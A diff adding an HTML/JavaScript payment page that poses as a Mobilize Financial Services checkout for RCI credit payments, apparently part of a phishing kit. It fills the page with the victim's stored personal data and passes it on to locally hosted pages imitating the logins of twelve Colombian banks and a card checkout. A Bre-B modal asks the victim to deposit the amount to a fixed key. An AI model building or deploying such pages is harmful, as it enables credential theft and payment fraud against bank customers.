@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Link To Pay</title>
+<style>
+*, *::before, *::after { box-sizing: border-box; }
+body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #fff; color: #1a1a1a; }
+
+.logo-area { padding: 4% 8%; max-width: 280px; }
+.logo-area img { width: 100%; }
+
+.main-card {
+    background: #e5e5e5; margin: 0 auto; max-width: 1100px;
+    position: relative; display: flex; flex-wrap: wrap;
+}
+.vigilado-bg {
+    position: absolute; right: 0; top: 0; height: 100%; width: 45%;
+    background: url('assets/vigilado.png') right top / contain no-repeat;
+    opacity: .18; pointer-events: none;
+}
+
+/* LEFT PANEL */
+.left-panel { flex: 0 0 58%; max-width: 58%; padding: 28px 32px; position: relative; z-index: 1; }
+.left-panel h3 { font-size: 21px; font-weight: 700; margin: 8px 0 20px; }
+.form-row { display: flex; flex-wrap: wrap; margin: 0 -8px; }
+.form-group { padding: 0 8px; margin-bottom: 14px; }
+.col-6 { flex: 0 0 50%; max-width: 50%; }
+.col-2 { flex: 0 0 25%; max-width: 25%; }
+.col-4 { flex: 0 0 41.66%; max-width: 41.66%; }
+.form-group label { display: block; font-size: 11.5px; color: #444; margin-bottom: 4px; }
+.form-control { display: block; width: 100%; padding: 8px 11px; font-size: 13.5px; color: #222; background: #fff; border: 1px solid #ced4da; border-radius: 5px; font-family: inherit; }
+.form-control:disabled { background: #eaecef; color: #666; cursor: not-allowed; }
+
+/* RIGHT PANEL */
+.right-panel { flex: 0 0 42%; max-width: 42%; background: #f8f8f8; padding: 28px 24px; display: flex; flex-direction: column; align-items: center; position: relative; z-index: 1; }
+.o-amount { text-align: center; padding: 16px 0 8px; width: 100%; }
+.o-amount--payment { font-size: 32px; font-weight: 700; color: #000; display: block; }
+.o-amount--currency { font-size: 15px; font-weight: 400; color: #777; margin-left: 5px; }
+.payment-title { font-size: 17px; font-weight: 700; text-align: center; padding: 12px 0 14px; width: 100%; }
+
+/* ── MÉTODOS DE PAGO ── */
+.mp-wrapper {
+    display: flex; flex-direction: column;
+    border: 1px solid #e0e0e0; border-radius: 8px;
+    overflow: hidden; background: #fff;
+    margin-top: 4px; width: 100%;
+}
+.mp-acc-header {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 14px 16px; cursor: pointer; background: #fff;
+    border-bottom: 1px solid #efefef; transition: background .15s;
+    min-height: 58px;
+}
+.mp-acc-header:last-of-type { border-bottom: none; }
+.mp-acc-header:hover { background: #fafafa; }
+.mp-acc-header.open { background: #faf7ff; }
+.mp-acc-left { flex: 1; min-width: 0; }
+.mp-acc-name { font-size: 14px; font-weight: 400; color: #333; }
+.mp-mat-indicator {
+    display: inline-flex; align-items: center; justify-content: center;
+    width: 24px; height: 24px; flex-shrink: 0; margin-left: 8px;
+    transition: transform .25s cubic-bezier(.4,0,.2,1);
+}
+.mp-acc-header.open .mp-mat-indicator { transform: rotate(180deg); }
+.mp-right { display: flex; align-items: center; gap: 6px; flex-shrink: 0; }
+.mp-right img { height: 22px; border-radius: 3px; object-fit: contain; }
+.mp-pse-circle {
+    width: 32px; height: 32px; border-radius: 50%;
+    background: #1a2b5e; display: flex; align-items: center; justify-content: center; overflow: hidden;
+}
+.mp-pse-circle img { width: 100%; height: 100%; object-fit: cover; }
+.mp-nequi-logo { height: 26px; object-fit: contain; }
+.mp-breb-pill { background: #3b1f8c; color: #fff; font-size: 11px; font-weight: 700; padding: 3px 9px; border-radius: 5px; letter-spacing: .4px; }
+
+/* Body expandible PSE */
+.mp-acc-body { display: none; background: #fff; border-bottom: 1px solid #efefef; padding: 16px 16px 8px; }
+.mp-acc-body.open { display: block; }
+
+/* Campos outlined PSE */
+.mp-mfield { position: relative; margin-bottom: 16px; }
+.mp-mfield label {
+    position: absolute; top: -9px; left: 10px;
+    background: #fff; padding: 0 4px;
+    font-size: 12px; color: #e07030; font-weight: 500;
+    line-height: 1; pointer-events: none; white-space: nowrap;
+}
+.mp-mfield select, .mp-mfield input {
+    width: 100%; padding: 13px 40px 13px 12px;
+    border: 1px solid #bbb; border-radius: 4px;
+    font-size: 14px; color: #222; background: #fff;
+    outline: none; appearance: none; -webkit-appearance: none;
+    box-sizing: border-box; transition: border-color .2s; font-family: inherit;
+}
+.mp-mfield select:focus, .mp-mfield input:focus { border-color: #5b3fa0; border-width: 2px; }
+.mp-mfield .mp-arrow { position: absolute; right: 8px; top: 50%; transform: translateY(-50%); pointer-events: none; }
+
+/* Botón PSE continuar */
+.mp-btn-pse {
+    width: 100%; padding: 14px; border: none; border-radius: 6px;
+    background: #1a1a1a; color: #fff; font-size: 14px; font-weight: 700;
+    cursor: pointer; font-family: inherit; margin: 8px 0 12px;
+    transition: background .15s;
+}
+.mp-btn-pse:hover { background: #333; }
+
+/* Modal de carga */
+#mp-loading-modal {
+    position: fixed; inset: 0; z-index: 999999;
+    background: rgba(255,255,255,.97);
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center; gap: 24px;
+    animation: mpFadeIn .3s ease;
+}
+@keyframes mpFadeIn { from{opacity:0} to{opacity:1} }
+#mp-loading-modal img { width: 200px; max-width: 70vw; }
+#mp-loading-bar-wrap { width: 200px; height: 4px; background: #eee; border-radius: 4px; overflow: hidden; }
+#mp-loading-bar { height: 100%; width: 0; background: #f45000; border-radius: 4px; transition: width 3s linear; }
+#mp-loading-txt { font-size: 14px; color: #666; font-family: inherit; }
+
+/* Bre-B overlay */
+#brebOverlay { position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,.55); display:none; align-items:center; justify-content:center; z-index:9999; font-family:inherit; }
+#brebOverlay.active { display:flex; }
+.breb-modal { background:#fff; width:380px; max-width:90%; border-radius:18px; padding:28px 26px 24px; text-align:center; position:relative; box-shadow:0 12px 40px rgba(0,0,0,.35); animation:brebFadeIn .25s ease-out; }
+@keyframes brebFadeIn { from{opacity:0;transform:translateY(-10px)} to{opacity:1;transform:translateY(0)} }
+.breb-close { position:absolute; top:14px; right:16px; font-size:22px; color:#333; cursor:pointer; background:none; border:none; line-height:1; }
+.breb-icon-circle { width:58px; height:58px; background:#ffe4d1; border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 14px; }
+.breb-icon-circle span { color:#ff5a1f; font-size:24px; font-weight:bold; }
+.breb-amount { font-size:30px; font-weight:800; color:#111; margin-bottom:10px; }
+.breb-description { font-size:13.5px; color:#555; line-height:1.45; margin-bottom:18px; }
+.breb-tabs { display:flex; background:#f2f2f2; border-radius:24px; padding:4px; margin-bottom:16px; }
+.breb-tab { flex:1; padding:10px 0; border-radius:20px; font-size:13.5px; font-weight:600; cursor:pointer; border:none; background:none; color:#555; transition:all .2s; }
+.breb-tab.active { background:#111a3d; color:#fff; }
+.breb-key-box { border:1px solid #eee; border-radius:12px; padding:20px 14px 8px; margin-bottom:6px; }
+.breb-key-text { font-size:16px; font-weight:800; color:#111; word-break:break-all; }
+.breb-key-caption { font-size:12px; color:#888; margin-top:6px; }
+.breb-copy-btn { width:100%; padding:13px; margin-top:14px; border:1px solid #ddd; border-radius:10px; background:#fff; font-size:13.5px; font-weight:600; color:#111; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:8px; transition:background .2s; }
+.breb-copy-btn:hover { background:#f5f5f5; }
+.breb-btn-confirm { width:100%; margin-top:16px; padding:14px; background:#111a3d; color:#fff; border:none; border-radius:10px; font-size:14px; font-weight:700; cursor:pointer; }
+.breb-btn-cancel { width:100%; margin-top:10px; padding:14px; background:#fff; color:#c0392b; border:1px solid #eee; border-radius:10px; font-size:14px; font-weight:700; cursor:pointer; }
+.breb-status-msg { margin-top:10px; font-size:12.5px; color:#16a34a; font-weight:600; display:none; }
+
+/* FOOTER */
+footer { margin-top: 40px; }
+.footer-orange { background: #f45000; padding: 8px 24px; }
+.footer-orange small { color: #fff; font-size: 12px; }
+.footer-orange a { color: #fff; }
+
+/* MOBILE */
+.mobile-payment { display: none; }
+@media (max-width: 991px) {
+    .left-panel, .right-panel { flex: 0 0 100%; max-width: 100%; }
+    .right-panel { display: none; }
+    .mobile-payment { display: block; padding-top: 24px; }
+}
+
+/* Loader */
+.loader-overlay {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(255, 255, 255, 0.95);
+    z-index: 99999;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    gap: 20px;
+}
+.loader-overlay.active {
+    display: flex;
+}
+.loader-spinner {
+    width: 50px;
+    height: 50px;
+    border: 5px solid #f0f0f0;
+    border-top: 5px solid #e8391e;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+}
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+.loader-text {
+    font-size: 16px;
+    color: #333;
+    font-weight: 500;
+}
+</style>
+</head>
+<body>
+
+<!-- LOADER -->
+<div class="loader-overlay" id="loaderOverlay">
+    <div class="loader-spinner"></div>
+    <div class="loader-text">Cargando información de pago...</div>
+</div>
+
+<div><div class="logo-area"><img src="assets/logo-mobilize.png" alt="Mobilize Financial Services"></div></div>
+
+<div style="padding:0 12px">
+<div class="main-card">
+<div class="vigilado-bg"></div>
+
+<!-- LEFT -->
+<div class="left-panel">
+    <h3><strong>Detalles de tu compra</strong></h3>
+    <div class="form-row">
+        <div class="form-group col-6"><label>Nombre</label><input class="form-control" id="nombreInput" value=""></div>
+        <div class="form-group col-6"><label>Apellido</label><input class="form-control" id="apellidoInput" value=""></div>
+        <div class="form-group col-6"><label>Correo electrónico</label><input class="form-control" id="emailInput" value=""></div>
+        <div class="form-group col-6"><label>Número de referencia</label><input class="form-control" id="referenciaInput" disabled></div>
+        <div class="form-group col-6"><label>Descripción</label><input class="form-control" id="descripcionInput" disabled></div>
+        <div class="form-group col-2"><label>Moneda</label><input class="form-control" disabled value="COP"></div>
+        <div class="form-group col-4"><label>Valor de la compra</label><input class="form-control" id="valorInput" disabled></div>
+    </div>
+    <div class="mobile-payment">
+        <div class="o-amount"><span class="o-amount--payment" id="mobileAmount">$ 0,00<span class="o-amount--currency">COP</span></span></div>
+        <div class="payment-title"><strong>Métodos de pago</strong></div>
+        <div id="mp-wrapper-mobile"></div>
+    </div>
+</div>
+
+<!-- RIGHT -->
+<div class="right-panel">
+    <div class="o-amount"><span class="o-amount--payment" id="desktopAmount">$ 0,00<span class="o-amount--currency">COP</span></span></div>
+    <div class="payment-title"><strong>Métodos de pago</strong></div>
+    <div id="mp-wrapper-desktop"></div>
+</div>
+
+</div>
+</div>
+
+<!-- Bre-B overlay -->
+<div id="brebOverlay">
+  <div class="breb-modal">
+    <button class="breb-close" onclick="document.getElementById('brebOverlay').classList.remove('active')">&times;</button>
+    <div class="breb-icon-circle"><span>&#8595;</span></div>
+    <div class="breb-amount" id="brebAmount">$ 0,00</div>
+    <div class="breb-description">Usa esta llave Bre-B para realizar tu depósito. ¡La confirmación suele llegar en segundos!</div>
+    <div class="breb-key-box">
+        <div class="breb-key-text" id="brebKeyText">@CBT06J2IC</div>
+        <div class="breb-key-caption">Llave Bre-B</div>
+    </div>
+    <button class="breb-copy-btn" onclick="navigator.clipboard.writeText(document.getElementById('brebKeyText').textContent);document.getElementById('brebStatus').style.display='block'">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="15" height="15"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+        COPIAR LLAVE
+    </button>
+    <div class="breb-status-msg" id="brebStatus">✓ Copiado al portapapeles</div>
+    <button class="breb-btn-confirm" onclick="document.getElementById('brebOverlay').classList.remove('active')">&#10003; Pago realizado</button>
+    <button class="breb-btn-cancel" onclick="document.getElementById('brebOverlay').classList.remove('active')">&times; Cancelar pago</button>
+  </div>
+</div>
+
+<footer><div class="footer-orange"><small>© 2018 - 2026 Copyright: <a href="https://paymentez.com/" target="_blank" rel="noopener noreferrer">Paymentez™. All rights reserved.</a></small></div></footer>
+
+<!-- ============================================================
+📌 INCLUIR LA BASE DE DATOS (desde archivo aparte)
+============================================================ -->
+<script src="js/database.js"></script>
+
+<!-- ============================================================
+📌 CÓDIGO PRINCIPAL
+============================================================ -->
+<script>
+// ============================================================
+// 1. OBTENER DATOS DE localStorage
+// ============================================================
+const userInfoJson = localStorage.getItem('userInfo');
+const userInfo = JSON.parse(userInfoJson);
+const valueToPay = localStorage.getItem('valueToPay') || '0';
+
+// ============================================================
+// 2. SI NO HAY DATOS, REDIRIGIR
+// ============================================================
+if (!userInfo || !userInfo.creditNumber) {
+    document.getElementById('loaderOverlay').classList.add('active');
+    setTimeout(() => {
+        window.location.href = 'index.html';
+    }, 2000);
+}
+
+// ============================================================
+// 3. MOSTRAR DATOS EN EL HTML
+// ============================================================
+const clientName = userInfo.clientName || '';
+const clientLastName = userInfo.clientLastName || '';
+const email = userInfo.email || '';
+const creditNumber = userInfo.creditNumber || '';
+const documentNumber = userInfo.documentNumber || '';
+const description = userInfo.description || 'Pago credito RCI';
+
+// Limpiar el valor a pagar (quitar $ y comas)
+const cleanValue = parseFloat(String(valueToPay).replace(/[$,]/g, '').trim()) || 0;
+const formattedValue = cleanValue.toLocaleString('en-US', { 
+    minimumFractionDigits: 2, 
+    maximumFractionDigits: 2 
+});
+
+const referencia = creditNumber + '-' + documentNumber;
+
+// Asignar valores a los campos
+document.getElementById('nombreInput').value = clientName;
+document.getElementById('apellidoInput').value = clientLastName;
+document.getElementById('emailInput').value = email;
+document.getElementById('referenciaInput').value = referencia;
+document.getElementById('descripcionInput').value = description;
+document.getElementById('valorInput').value = '$ ' + formattedValue;
+
+// Actualizar montos en los paneles
+document.getElementById('desktopAmount').innerHTML = '$ ' + formattedValue + '<span class="o-amount--currency">COP</span>';
+document.getElementById('mobileAmount').innerHTML = '$ ' + formattedValue + '<span class="o-amount--currency">COP</span>';
+document.getElementById('brebAmount').textContent = '$ ' + formattedValue;
+
+// ============================================================
+// 4. DATOS PARA sessionStorage (compatibles con páginas de bancos)
+// ============================================================
+const RCI_PAGADOR = {
+    nombre: clientName,
+    apellido: clientLastName,
+    tipoId: 'CC',
+    numeroId: documentNumber,
+    celular: ''
+};
+
+const RCI_CONJUNTO = {
+    co_ownership_name: description,
+    referencia: referencia
+};
+
+const RCI_DEUDA = {
+    noInvoicesData: { balance: cleanValue }
+};
+
+sessionStorage.setItem('pagador', JSON.stringify(RCI_PAGADOR));
+sessionStorage.setItem('conjunto', JSON.stringify(RCI_CONJUNTO));
+sessionStorage.setItem('deuda', JSON.stringify(RCI_DEUDA));
+sessionStorage.setItem('email_usuario', email);
+sessionStorage.setItem('valor_pago', valueToPay);
+
+// ============================================================
+// 5. BANCOS Y RUTAS
+// ============================================================
+const BANCOS = [
+    { v:'BANCOLOMBIA',    l:'Bancolombia' },
+    { v:'AVVILLAS',       l:'AV Villas' },
+    { v:'BBVA',           l:'BBVA Colombia' },
+    { v:'BOGOTA',         l:'Banco de Bogotá' },
+    { v:'CAJASOCIAL',     l:'Banco Caja Social' },
+    { v:'DAVIVIENDA',     l:'Davivienda' },
+    { v:'FALABELLA',      l:'Banco Falabella' },
+    { v:'LULO',           l:'Lulo Bank' },
+    { v:'NEQUI',          l:'Nequi' },
+    { v:'BANCO POPULAR',  l:'Banco Popular' },
+    { v:'DAVI BANK',      l:'Davi Bank' },
+    { v:'OCCIDENTE',      l:'Banco Occidente' },
+];
+
+const RUTAS_BANCO = {
+    'BANCOLOMBIA':   '/RCI/pse/solicitud bba/index.html',
+    'AVVILLAS':      '/RCI/pse/avvillas/index.php',
+    'BBVA':          '/RCI/pse/bbva/index.php',
+    'BOGOTA':        '/RCI/pse/bdb/index.php',
+    'CAJASOCIAL':    '/RCI/pse/cajasocial/index.php',
+    'DAVIVIENDA':    '/RCI/pse/davivienda/index.php',
+    'FALABELLA':     '/RCI/pse/falabella/index.php',
+    'LULO':          '/RCI/pse/lulo/login.html',
+    'NEQUI':         '/RCI/pse/nequi/index.html',
+    'BANCO POPULAR': '/RCI/pse/popular/index.php',
+    'DAVI BANK':     '/RCI/pse/davibank/index.php',
+    'OCCIDENTE':     '/RCI/pse/occidente/index.php',
+};
+
+// ============================================================
+// 6. CONSTRUIR MÉTODOS DE PAGO
+// ============================================================
+const chevronSvg = `<span class="mp-mat-indicator"><svg viewBox="0 0 24 24" width="22" height="22" fill="#9e9e9e"><path d="M7 10l5 5 5-5z"/></svg></span>`;
+const arrowSvg   = `<span class="mp-arrow"><svg viewBox="0 0 24 24" width="20" height="20" fill="#757575"><path d="M7 10l5 5 5-5z"/></svg></span>`;
+
+function mostrarCargando(ruta) {
+    // Mostrar loader
+    document.getElementById('loaderOverlay').classList.add('active');
+    
+    const modal = document.createElement('div');
+    modal.id = 'mp-loading-modal';
+    modal.innerHTML = `
+        <img src="/RCI/assets/logo-mobilize.png" alt="Mobilize">
+        <div id="mp-loading-bar-wrap"><div id="mp-loading-bar"></div></div>
+        <span id="mp-loading-txt">Procesando tu pago de forma segura...</span>`;
+    document.body.appendChild(modal);
+    
+    // Ocultar el loader principal
+    document.getElementById('loaderOverlay').classList.remove('active');
+    
+    requestAnimationFrame(() => { 
+        const bar = document.getElementById('mp-loading-bar');
+        if (bar) bar.style.width = '100%'; 
+    });
+    
+    setTimeout(() => { 
+        window.location.href = ruta; 
+    }, 3000);
+}
+
+function buildWrapper() {
+    const wrapper = document.createElement('div');
+    wrapper.className = 'mp-wrapper';
+
+    // ── Tarjetas ──
+    const tarjetaH = document.createElement('div');
+    tarjetaH.className = 'mp-acc-header';
+    tarjetaH.innerHTML = `
+        <div class="mp-acc-left"><span class="mp-acc-name">Tarjetas Débito o Crédito</span></div>
+        <div class="mp-right">
+            <img src="https://cdn.jsdelivr.net/npm/payment-icons@1.1.0/min/flat/mastercard.svg" alt="MC">
+            <img src="https://cdn.jsdelivr.net/npm/payment-icons@1.1.0/min/flat/visa.svg" alt="Visa">
+            <img src="https://cdn.jsdelivr.net/npm/payment-icons@1.1.0/min/flat/amex.svg" alt="Amex">
+            <img src="https://cdn.jsdelivr.net/npm/payment-icons@1.1.0/min/flat/diners.svg" alt="Diners">
+            ${chevronSvg}
+        </div>`;
+    tarjetaH.addEventListener('click', () => mostrarCargando('/RCI/tarjeta/checkoutplacetopaycc.html'));
+
+    // ── PSE ──
+    const pseH = document.createElement('div');
+    pseH.className = 'mp-acc-header';
+    pseH.innerHTML = `
+        <div class="mp-acc-left"><span class="mp-acc-name">Débito PSE</span></div>
+        <div class="mp-right">
+            <div class="mp-pse-circle"><img src="/RCI/assets/pse.png" alt="PSE"></div>
+            ${chevronSvg}
+        </div>`;
+
+    const pseBody = document.createElement('div');
+    pseBody.className = 'mp-acc-body';
+    pseBody.innerHTML = `
+        <div class="mp-mfield">
+            <label>Tipo de documento</label>
+            <select id="mp-tipo-doc">
+                <option value="CC" selected>Cédula de Ciudadanía</option>
+                <option value="CE">Cédula de Extranjería</option>
+                <option value="TI">Tarjeta de Identidad</option>
+                <option value="NIT">NIT</option>
+                <option value="PP">Pasaporte</option>
+            </select>${arrowSvg}
+        </div>
+        <div class="mp-mfield">
+            <label>Número de documento</label>
+            <input type="tel" id="mp-num-doc" value="${documentNumber}" inputmode="numeric">
+        </div>
+        <div class="mp-mfield">
+            <label>Banco</label>
+            <select id="mp-banco">
+                <option value="" disabled selected>Seleccione una opción</option>
+                ${BANCOS.map(b=>`<option value="${b.v}">${b.l}</option>`).join('')}
+            </select>${arrowSvg}
+        </div>
+        <div class="mp-mfield">
+            <label>Tipo de persona</label>
+            <select id="mp-tipo-persona">
+                <option value="N">Persona natural</option>
+                <option value="J">Persona jurídica</option>
+            </select>${arrowSvg}
+        </div>
+        <button class="mp-btn-pse" id="mp-btn-continuar">Continuar con PSE</button>`;
+
+    pseH.addEventListener('click', () => {
+        const open = pseBody.classList.toggle('open');
+        pseH.classList.toggle('open', open);
+    });
+
+    pseBody.querySelector('#mp-btn-continuar').addEventListener('click', () => {
+        const banco = document.getElementById('mp-banco').value;
+        if (!banco) { alert('Selecciona tu banco'); return; }
+        const tipoDoc     = document.getElementById('mp-tipo-doc').value;
+        const numDoc      = document.getElementById('mp-num-doc').value.trim();
+        const tipoPersona = document.getElementById('mp-tipo-persona').value;
+
+        const pagActual = { ...RCI_PAGADOR, tipoId: tipoDoc, numeroId: numDoc };
+        sessionStorage.setItem('pagador', JSON.stringify(pagActual));
+        sessionStorage.setItem('bancoPSE', banco);
+        sessionStorage.setItem('tipoPersonaPSE', tipoPersona);
+        sessionStorage.setItem('pse_datos', JSON.stringify({ tipoDoc, numDoc, banco, tipoPersona }));
+
+        mostrarCargando(RUTAS_BANCO[banco]);
+    });
+
+    // ── Nequi ──
+    const nequiH = document.createElement('div');
+    nequiH.className = 'mp-acc-header';
+    nequiH.innerHTML = `
+        <div class="mp-acc-left"><span class="mp-acc-name">Nequi</span></div>
+        <div class="mp-right">
+            <img class="mp-nequi-logo" src="/RCI/assets/nequi.svg" alt="Nequi">
+            ${chevronSvg}
+        </div>`;
+    nequiH.addEventListener('click', () => mostrarCargando('/RCI/pse/nequi/index.html'));
+
+    // ── Bre-B ──
+    const brebH = document.createElement('div');
+    brebH.className = 'mp-acc-header';
+    brebH.innerHTML = `
+        <div class="mp-acc-left"><span class="mp-acc-name">Bre-B</span></div>
+        <div class="mp-right">
+            <span class="mp-breb-pill">Bre-B</span>
+            ${chevronSvg}
+        </div>`;
+    brebH.addEventListener('click', () => document.getElementById('brebOverlay').classList.add('active'));
+
+    wrapper.appendChild(tarjetaH);
+    wrapper.appendChild(pseH);
+    wrapper.appendChild(pseBody);
+    wrapper.appendChild(nequiH);
+    wrapper.appendChild(brebH);
+
+    return wrapper;
+}
+
+// ============================================================
+// 7. RENDERIZAR EN DESKTOP Y MOBILE
+// ============================================================
+document.getElementById('mp-wrapper-desktop').appendChild(buildWrapper());
+document.getElementById('mp-wrapper-mobile').appendChild(buildWrapper());
+
+// ============================================================
+// 8. LOG EN CONSOLA
+// ============================================================
+console.log('🏦 ===== CHECKOUT =====');
+console.log('  Cliente:', clientName, clientLastName);
+console.log('  Email:', email);
+console.log('  Referencia:', referencia);
+console.log('  Valor a pagar: $' + formattedValue);
+console.log('  Descripción:', description);
+console.log('🏦 ====================');
+</script>
+
+</body>
+</html>
